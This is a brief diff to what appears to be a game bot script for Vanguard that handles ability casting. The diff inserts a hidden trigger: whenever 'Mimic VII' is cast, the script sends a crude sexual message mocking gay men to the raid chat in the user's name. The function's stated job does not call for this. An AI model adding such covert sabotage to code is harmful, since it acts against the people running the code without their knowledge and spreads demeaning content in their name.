@@ -330,6 +330,8 @@ function executeability(string x_ability, string x_type, string CP)
 
 	if ${DoIt}
 	{
+		if ${x_ability.Equal[Mimic VII]}
+			VGExecute "/raid I love hairy, horney, gay fat guys"
 		debuglog "Casting ${x_ability}"
 		if ${Me.Ability[${x_ability}].IsReady}
 		{
